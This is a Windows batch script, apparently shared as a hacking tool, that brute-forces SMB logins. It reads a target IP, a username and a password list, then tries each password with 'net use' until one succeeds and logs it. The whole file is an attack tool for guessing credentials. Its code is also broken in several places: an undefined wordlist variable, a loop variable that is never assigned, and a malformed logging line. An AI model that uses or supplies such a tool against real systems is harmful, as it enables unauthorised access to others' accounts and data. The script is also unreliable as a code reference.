@echo off
title SMB Bruteforce - by anx13ty
color A
echo.

set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p pass="Enter Password List File: "

if not exist "%pass%" (
    echo Password List File Not Found
    pause
    exit /b
)

for /f %%a in (%wordlist%) do (
    set pass=%%
    call :attempt
)

:success
echo Password Found!: %pass%
echo %date% %time% - Password Found
for %user%@%ip% >> success.log
net use \\%ip% /d /y >nul 2>&1
pause 
exit

:attempt
echo Attempting Password:%pass%
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo attempt: %pass%
if %errorlevel% EQU 0 goto success